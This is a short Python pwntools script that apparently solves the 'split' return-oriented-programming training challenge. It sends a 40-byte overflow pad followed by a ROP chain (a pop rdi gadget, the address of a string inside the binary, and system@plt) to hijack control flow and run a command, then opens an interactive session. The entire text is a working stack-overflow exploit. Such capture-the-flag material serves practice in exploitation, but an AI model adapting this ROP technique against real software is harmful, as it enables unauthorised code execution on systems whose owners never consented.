from pwn import *

context.arch = 'amd64'

io = process('./split')

useful_string = 0x601060
pop_rdi_ret_addr = 0x4007c3
elf = ELF('./split')

payload = cyclic(32 + 8) + p64(pop_rdi_ret_addr) + p64(useful_string) + p64(elf.plt['system'])

io.sendlineafter(b'> ', payload)

io.interactive()